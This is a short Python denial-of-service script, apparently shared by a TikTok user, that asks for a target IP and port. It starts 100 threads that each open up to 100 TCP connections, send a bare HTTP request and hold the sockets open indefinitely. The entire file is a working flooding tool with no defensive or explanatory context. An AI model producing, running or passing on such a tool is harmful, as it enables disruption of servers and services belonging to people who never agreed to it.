import socket
import threading
import time
import os

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
os.system("clear")
print("MADE BY apexvr_ ON TIKTOK")
NUM_THREADS = 100
CONNS_PER_THREAD = 100

def flood():
    sockets = []
    for _ in range(CONNS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(b"GET / HTTP/1.1\r\nHost: flood\r\n\r\n")
            sockets.append(s)
        except Exception as e:
            pass
    while True:
        time.sleep(10)

threads = []

for i in range(NUM_THREADS):
    t = threading.Thread(target=flood, name=f"-{i+1}")
    t.start()
    threads.append(t)

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\nStopped manually (Ctrl+C)")
